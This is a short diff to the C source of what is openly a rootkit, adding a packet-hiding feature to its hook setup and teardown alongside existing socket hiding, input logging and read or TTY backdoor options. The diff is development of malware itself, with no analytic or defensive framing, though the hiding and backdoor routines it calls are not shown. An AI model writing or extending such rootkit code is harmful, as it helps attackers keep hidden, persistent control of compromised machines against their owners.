@@ -22,6 +22,7 @@
 #include "read.h"
 #include "inputlog.h"
 #include "sockhide.h"
+#include "packhide.h"
 
 extern rootkit_t rootkit;
 
@@ -87,6 +88,9 @@ init_hooks(void)
     if (rootkit.hiding_sockets)
         hide_sockets();
 
+    if (rootkit.hiding_packets)
+        hide_packets();
+
     if (rootkit.backdoor == BD_READ)
         backdoor_read();
     else if (rootkit.backdoor == BD_TTY)
@@ -115,6 +119,9 @@ remove_hooks(void)
 
     if (rootkit.hiding_sockets)
         unhide_sockets();
+
+    if (rootkit.hiding_packets)
+        unhide_packets();
 
     if (rootkit.backdoor != BD_OFF)
         unbackdoor();
